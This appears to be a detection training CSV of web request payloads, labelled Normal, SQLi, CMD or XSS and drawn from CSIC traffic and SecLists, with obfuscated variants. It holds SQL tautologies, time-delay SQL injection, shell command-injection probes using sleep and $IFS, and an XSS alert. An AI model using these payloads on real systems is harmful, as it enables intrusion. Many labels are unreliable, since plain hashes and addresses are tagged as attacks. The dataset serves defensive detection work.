payload,label,source
"modo=registro&login=earles&password=basEl�Ceo&nombre=Hugolino&apellidos=Mallorqu�+Pastoret&email=mizell@x2.com.vu&dni=19477061V&direccion=Calle+Virgen+Marinera,+85+&ciudad=Xove&cp=02513&provincia=Salamanca&ntc=5404266058977380&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
modo%253Dinsertar%2526precio%253D285%2526B1A%253DPasar%252Bpor%252Bcaja,SQLi,obfuscation:double_url_encode
"\u006dod\u006f=r\u0065gi\u0073\u0074ro&\u006co\u0067\u0069n=b\u006f\u0075r\u006b&p\u0061s\u0073\u0077ord=\u0061\u0063o\u004doD\u0061mIEnTO&n\u006fmbr\u0065=Raffe\u0072\u0074y&\u0061p\u0065\u006c\u006ci\u0064os=_Es?c\u0072\u0069\u0062ano+Go\u0075&\u0065\u006dail=la\u0066ur\u0065\u0074@\u0063\u006f\u0072ti\u006e\u0061s-de-\u0061ire.\u0061\u0069&d\u006e\u0069=56038958X&d\u0069\u0072eccio\u006e=G\u0069j\u006fn,+93,+6?E&\u0063i\u0075da\u0064=\u0050\u006f\u007a\u0075\u0065l\u006f&\u0063p=41749&pr\u006fvinc\u0069a=Bar\u0063e\u006co\u006ea&ntc=4929562421029680&\u00421=\u0052eg\u0069\u0073trar",SQLi,obfuscation:unicode_escape
8C192CB7E3CE731565A88CE79C630AF6,Normal,csic_gsi:cisc_normalTraffic_test.txt
"--WebKitFormBoundary98409
Content-Disposition: form-data; name=""q""

BD1A55F27CFDACFDB5E29777622AA241
--WebKitFormBoundary98409--",SQLi,obfuscation:multipart_boundary_sim
8395A60606E15ABC8441335ADDE77CE3,Normal,csic_gsi:cisc_normalTraffic_train.txt
1e\u0073m7n8\u00688r,SQLi,obfuscation:unicode_escape
800eb9Ce43979EA186DA98B366701001,SQLi,obfuscation:case_random
5865709EE5877E8BEE26FA8CC05A85E4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Calｌe+Loｓ+Hoteliｔｏｓ+S/N,+",SQLi,obfuscation:unicode_normalization
349843A21803647F\u0043B\u0045D\u00442\u0043679\u00454558\u0043,SQLi,obfuscation:unicode_escape
4DDD8B341303DE2BA1ACE49E9EB55864,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20FUFPKN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
21E09EDEF8C4117C37914DB3DB5A210C,Normal,csic_gsi:cisc_normalTraffic_test.txt
49CE40B976E0C87A2B4AC6E2E5EAB6A0,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('JTI1MjIlN0MlMjAlNUIlMjA5JTIwLW5lJTIwJTI0JTI4ZWNobyUyMA=='))NREISI%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,obfuscation:base64_fragment
54C6BD1EE6BC7A7543B2C92441EEA665,Normal,csic_gsi:cisc_normalTraffic_test.txt
CC9160F3990D2E07EC05A5938E7D0FB9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
rEpRoDucCi�N,Normal,csic_gsi:cisc_normalTraffic_test.txt
"--WebKitFormBoundary34010
Content-Disposition: form-data; name=""q""

%0aecho$IFSODUPZQ$((21%2B13))$(echo$IFSODUPZQ)ODUPZQ%5C%5C
--WebKitFormBoundary34010--",CMD,obfuscation:multipart_boundary_sim
%2527%2526%2526echo%2524IFSBDQKRH%2524%2528%252834%25252B46%2529%2529%2524%2528echo%2524IFSBDQKRH%2529BDQKRH%2522,CMD,obfuscation:double_url_encode
CBD5C6F3FB32723F07611B71F5676A5C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%205%20-ne%20%24%28echo%20UKWXJP%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
id=1&id=30,SQLi,obfuscation:hpp_duplicate_param
7CCCAC70888F2993C9143DC36822C06E,Normal,csic_gsi:cisc_normalTraffic_test.txt
eval(atob('R2FyZ2FudGlsbGErZGVsK0xvem95YSt5K1BpbmlsbGErZGUrQnVpdA=='))rago,SQLi,obfuscation:base64_fragment
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20PDOPTJ%29%20%26%26%20str1%3D%24%7B%00%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20//,CMD,obfuscation:null_byte
"{""a"":{""b"":""modo=registro&login=chrisy&password=7n3i083zo','0','0','0','0');waitfor+delay+'0:0:15';--&nombre=Tom�s&apellidos=Mares+Mulleras&email=aylmer@pisossantcugat.pl&dni=04472501J&direccion=Gravina+197+3?H&ciudad=Calzadilla+de+Tera&cp=46827&provincia=Cuenca&ntc=7996895110966395&B1=Registrar""}}",SQLi,obfuscation:json_nested_escape
eval(atob('UGFzYXIrcG9yK2NhamE/')),SQLi,obfuscation:base64_fragment
EnTe+6A7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1976494121699035' OR '1'='1,SQLi,obfuscation:logic_or_tautology
EF3C8096E93D0740C0F325C0DF9273C1' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"CONCAT(CHAR(97),CHAR(48),CHAR(49),CHAR(56),CHAR(54),CHAR(57),CHAR(57),CHAR(116),CHAR(48),CHAR(100),CHAR(111))",SQLi,obfuscation:char_function
14157DEEC241B27AB96F7567BFF26852,Normal,csic_gsi:cisc_normalTraffic_test.txt
25151,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
encabar,Normal,csic_gsi:cisc_normalTraffic_train.txt
"{""a"":{""b"":""modo=insertarbob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org&precio=2248&B1=Confirmar""}}",XSS,obfuscation:json_nested_escape
5525651112405AE4C62467C641988788,Normal,csic_gsi:cisc_normalTraffic_train.txt
A56F002E440704769B3D34BA5E83CE38,Normal,csic_gsi:cisc_normalTraffic_train.txt
"{""a"":{""b"":""modo=registro&login=bhasin&password=desOndra&nombreA=Saiguen&apellidos=Pedercini+Borda&email=mims@hojadecalculo.com.ae&dni=36868779D&direccion=Soria+32,+3?E&ciudad=Arroyomolinos+de+la+Vera&cp=10883&provincia=Segovia&ntc=6892387186647118&B1=Registrar""}}",SQLi,obfuscation:json_nested_escape
C3339DFAD12DF68746867330CCA4B9A8,Normal,csic_gsi:cisc_normalTraffic_test.txt
|echo%20FNYPPK$((77%2B83))$(echｏ%20FNYPPK)FNYPPK&,CMD,obfuscation:unicode_normalization
%25257C%252520%25255B%2525208%252520-ne%252520%252524%252528echo%252520UKWXJP%252520%25257C%252520tr%252520-d%252520%252527%25255Cn%252527%252520%25257C%252520wc%252520-c%252529%252520%25255D%252520%25257C%25257C%252520sleep%2525201%252520%252523,CMD,obfuscation:double_url_encode
%2522%7C%20%5B%206%20-ne%20%24%28echo%20XHMATL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22,CMD,seclists_cmd
modo=insertar&precio=5548&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%7C%20%5B%209%20-ne%20%24%28echo%20ZDDHYL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%00%7C%7C%20sleep%201%20%23,CMD,obfuscation:null_byte
id=2&ｎombrｅ=Qｕeｓ+o+Maｎchegｏ&preciｏ=39&caｎｔｉdad=88&B1=A�adir+al+carriｔo,SQLi,obfuscation:unicode_normalization
F9B16EAD11FF8B3EE58F1DF0A9C891DA,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0aecho%20LBEVAD$((90%2B55))$(echo%20LBEVAD)LBEVAD%2F%2F,CMD,seclists_cmd
"{""a"":{""b"":""4421F14E515B481ED8A104604AE557B0""}}",SQLi,obfuscation:json_nested_escape
%2527%7C%20%5B%202%20-ne%20%24%28echo%20FMCMJN%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%26,CMD,seclists_cmd
Pi�rnigas,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520LVVACM%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25207%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2F%2F,CMD,obfuscation:url_encode
%2522%257Cecho%2524IFSJTANTD%2524%2528%252865%25252B98%2529%2529%2524%2528echo%2524IFSJTANTD%2529JTANTD%255C,CMD,obfuscation:double_url_encode
"--WebKitFormBoundary64015
Content-Disposition: form-data; name=""q""

B475B5AC32CC4A3B64291FBC73A725BC
--WebKitFormBoundary64015--",SQLi,obfuscation:multipart_boundary_sim
eval(atob('bW9kbz1lbnRyYXImbG9naW49YnJlZ2xlYyZwd2Q9YWxFR3Lvv71uJnJl'))member=on/&B1=Entrar,SQLi,obfuscation:base64_fragment
D965DA97186283E4947E6206E0F0E82E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22echo$IFSXVVJRH$((4%2B71))$(echo$IFSXVVJRH)XVVJRH%7C,CMD,seclists_cmd
%3B%20sｔr%3D%24%28ｅcho%20ZSSQMT%29%3B%20ｓtr1%3D%24%7B%23str%7D%3B%20ｉf%20%5B%206%20-nｅ%20%24%7Bstr1%7D%20%5D%3B%20thｅn%20ｓｌｅep%200%3B%20ｅlsｅ%20ｓleｅp%201%3B%20fｉ%20,CMD,obfuscation:unicode_normalization
%0A%20str%3D%24%28echo%20IKKWEG%29%0A%20str1%3D%24%7%00B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,obfuscation:null_byte
F663925619E3FB0CCDDE2538E82A5D05,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Ballena,+91,+10?A",Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary74085
Content-Disposition: form-data; name=""q""

Curiel+de+Duero
--WebKitFormBoundary74085--",SQLi,obfuscation:multipart_boundary_sim
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JHKWGE%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,CMD,seclists_cmd
&&echo%20TQHCUN$((6%2B71))$(echo%20TQHCUN)TQHCUN,CMD,seclists_cmd
jｕlｅe,SQLi,obfuscation:unicode_normalization
F8AC6DCB363F437BA63B%00FE4D9375F78B,SQLi,obfuscation:null_byte
modo=entrar&loginA=robles&pwd=A6om00�4471&remember=off&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('ZW1lbGlhNw==')),SQLi,obfuscation:base64_fragment
96396EFDB10883\u00424D250\u0041F\u00456B924BC7\u0042,SQLi,obfuscation:unicode_escape
81fC01b26a44Fb595453fD2bE211471e,SQLi,obfuscation:case_random
"{""a"":{""b"":""2503A93CBEAC2CDCB317E36F5593F571""}}",SQLi,obfuscation:json_nested_escape
%27%%000aecho%20LSICCV$((22%2B94))$(echo%20LSICCV)LSICCV,CMD,obfuscation:null_byte
"--WebKitFormBoundary83020
Content-Disposition: form-data; name=""q""

7A36653A0E1FF86898AFEBD7ED45E7F9
--WebKitFormBoundary83020--",SQLi,obfuscation:multipart_boundary_sim
%22||echo$IFSANXKRH$((27%2B96))$(echo$IFSANXKRH)ANXKRH%5C%5C,CMD,seclists_cmd
%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520QELUFF%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25207%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%25252F%25252F,CMD,obfuscation:url_encode
eval(atob('JTdDJTIwJTVCJTIwNyUyMC1uZSUyMCUyNCUyOGVjaG8lMjBRSkRCSg=='))N%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,obfuscation:base64_fragment
Tatiano' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%2527%2526echo%2520VFLICS%24%28%2840%252B73%29%29%24%28echo%2520VFLICS%29VFLICS%257C,CMD,obfuscation:url_encode
"Carrer+De+Francesc+Boix+i+Campo,+194+10?G",Normal,csic_gsi:cisc_normalTraffic_test.txt
id=1&id=0DE819047275F6CB46F876CE054D194A,SQLi,obfuscation:hpp_duplicate_param
8E81DF92C0FE245562A6560E760B9357' OR '1'='1,SQLi,obfuscation:logic_or_tautology
AFBBC61DDB37D34E266A21BEF39B7A94,Normal,csic_gsi:cisc_normalTraffic_train.txt
"eval(atob('aWQ9MyZub21icmU9VmlubytSaW9qYSZwcmVjaW89MTAwJywnMCcsJw=='))0','0');waitfor+delay+'0:0:15';--&cantidad=85&B1=A�adir+al+carrito",SQLi,obfuscation:base64_fragment
3552DD2D6695D54AC690C00FBCAF3159,Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary50044
Content-Disposition: form-data; name=""q""

4936D3EC76BC86B569CA00E8CCCC89EB
--WebKitFormBoundary50044--",SQLi,obfuscation:multipart_boundary_sim
"CONCAT(CHAR(53),CHAR(48),CHAR(55),CHAR(48),CHAR(51),CHAR(50),CHAR(56),CHAR(50),CHAR(57),CHAR(50),CHAR(54),CHAR(49),CHAR(51),CHAR(54),CHAR(57))",SQLi,obfuscation:char_function
%26%20s\u006c\u0065\u0065p%200%20%26%26%20\u0073t\u0072%3\u0044%24%28\u0065c\u0068o%20GH\u0047\u0056OR%29%20%26%26%20s\u0074r1%3\u0044%24%7\u0042%23str%7D%20%26%26%20%5\u0042%205%20-\u0065q%20%24%7\u0042\u0073\u0074\u00721%7\u0044%20%5D%20%26%26%20\u0073\u006c\u0065e\u0070%201%20%23,CMD,obfuscation:unicode_escape
9EFC9A49F3665B949F57471B78A2A151,Normal,csic_gsi:cisc_normalTraffic_train.txt
DECA99D9445177A95D7D756C9B9%00BD268,SQLi,obfuscation:null_byte
43C931AD1B26A3ABD14FA6C1632FB52B,Normal,csic_gsi:cisc_normalTraffic_train.txt
41510,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
42066,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20ｓｔr%3D%24%28ｅchｏ%20HNLFQM%29%3B%20str1%3D%24%7B%23ｓtr%7D%3B%20if%20%5B%209%20-ｎｅ%20%24%7Bｓｔr1%7D%20%5D%3B%20ｔhｅｎ%20sｌeep%200%3B%20ｅlsｅ%20sｌｅep%201%3B%20fｉ%20%2526,CMD,obfuscation:unicode_normalization
eval(atob('JTI2JTIwc2xlZXAlMjAwJTIwJTI2JTI2JTIwc3RyJTNEJTI0JTI4ZQ=='))cho%20UGGXTG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%27,CMD,obfuscation:base64_fragment
eval(atob('RDdDRDE4RjMzNEE3NThDOUYxQzI5MDFCOEYwNUM4MUU=')),SQLi,obfuscation:base64_fragment
498C386D15786303D99D5AB7633DA967,Normal,csic_gsi:cisc_normalTraffic_train.txt
"id=1&id=Pl.+La+Merced,+107+4C",SQLi,obfuscation:hpp_duplicate_param
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20XTMPBT%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7B%00str1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,obfuscation:null_byte
"--WebKitFormBoundary25247
Content-Disposition: form-data; name=""q""

%0A%20str%3D%24%28echo%20KEZMWT%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C
--WebKitFormBoundary25247--",CMD,obfuscation:multipart_boundary_sim
"Calle+Malva+1,+4-H",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('JTIyJmVjaG8kSUZTV0ZERVVMJCgoODAlMkI5MCkpJChlY2hvJElGUw=='))WFDEUL)WFDEUL%22,CMD,obfuscation:base64_fragment
"modo=registro&login=markland&password=6os878rn8&nombre=Nolsaco&apellidos=Zarzalejo+Vendrell&email=coulson.koster@lasiestacreativa.ph&dni=17456236H&direccion=Plza.+De+Los+Jardinillos+75,+&ciudad=Esguevillas+de+Esgueva&cp=34757&provincia=A+Coru�a&ntc=743503971711980&B1=Registrar/*--*/",SQLi,obfuscation:nested_comment
%27%0A%20str%3D%24%28echo%20FYHGFL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
%27%26%20\u0073lee\u0070%200%20%26%26%20s\u0074r%3\u0044%24%28echo%20\u0042OD\u0057Q\u0044%29%20%26%26%20\u0073tr1%3D%24%7\u0042%23s\u0074\u0072%7\u0044%20%26%26%20%5B%204%20-\u0065q%20%24%7Bs\u0074\u00721%7D%20%5D%20%26%26%20\u0073\u006c\u0065\u0065\u0070%201%20%252\u0046%252F,CMD,obfuscation:unicode_escape
"--WebKitFormBoundary24076
Content-Disposition: form-data; name=""q""

F25607C34284EB861996AE62BD9DB7F7
--WebKitFormBoundary24076--",SQLi,obfuscation:multipart_boundary_sim
%2%002;echo$IFSBKQZPW$((40%2B60))$(echo$IFSBKQZPW)BKQZPW%5C%5C,CMD,obfuscation:null_byte
25C3CA4EE6AA5C186CF8350EE9855EC6,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('NTY4ODE5MjUyNzk2MDQ3Nw==')),SQLi,obfuscation:base64_fragment
ECD0C05547F2C7F22AA4BCB5F3B8F34D,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=registro&login=hendryck&password=malav4n5657&nombre=Romanela&apellidos=Canovas+Jodar&email=ziegel.beverly@kpincentives.vu&dni=03263111D&direccion=Marte+44+&ciudad=Meis&cp=10137&provincia=Burgos&ntc=7454500014712200&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
A0A8dc1bC005136E6671b7FfeED5E0bf,SQLi,obfuscation:case_random
"CONCAT(CHAR(101),CHAR(99),CHAR(107),CHAR(104),CHAR(97),CHAR(114),CHAR(100),CHAR(116),CHAR(64),CHAR(101),CHAR(110),CHAR(103),CHAR(108),CHAR(105),CHAR(115))",SQLi,obfuscation:char_function
Celedonio' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"modo=registro&login=sriram&password=PErdiDOso&nombre=Orosm�n&apellidosA=Berzoni+Arzaluz&email=bonardo@ciaplast.gu&dni=04932437H&direccion=Plza.+De+Los+Fueros+38,+&ciudad=Almenara&cp=12170&provincia=Girona&ntc=6385290381034748&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20str%3D%24%28echo%20APHWVY%%0029%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20,CMD,obfuscation:null_byte
%0AEChO$ifSGamIHF$((8%2B20))$(eChO$IfsgamIHf)gAmIHf//,CMD,obfuscation:case_random
18F1C52C1D1798C54C674A5894535591' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"--WebKitFormBoundary10733
Content-Disposition: form-data; name=""q""

aviadora
--WebKitFormBoundary10733--",SQLi,obfuscation:multipart_boundary_sim
%7C%7Cｅchｏ$IFSKNLSBT$((88%2B60))$(ｅchｏ$IFSKNLSBT)KNLSBT&,CMD,obfuscation:unicode_normalization
909B766CA8AE4FDFAE756501824BDAAF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%26ecHo$IfSdTKgow$((36%2b42))$(eChO$iFsDTKgOw)DtKGoW//,CMD,obfuscation:case_random
print(`echo%20WZLIFQ`.`echo%20$((3%2B42))`.`echo%20WZLIFQ`.`echo%20WZLIFQ`)%29%7DWZLIFQ,CMD,seclists_cmd
modo=insertar&precio=1715&B1=Confirmar/' OR '1'='1,SQLi,obfuscation:logic_or_tautology
0DAB6C743706FB6ED6E92242B7988A32,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
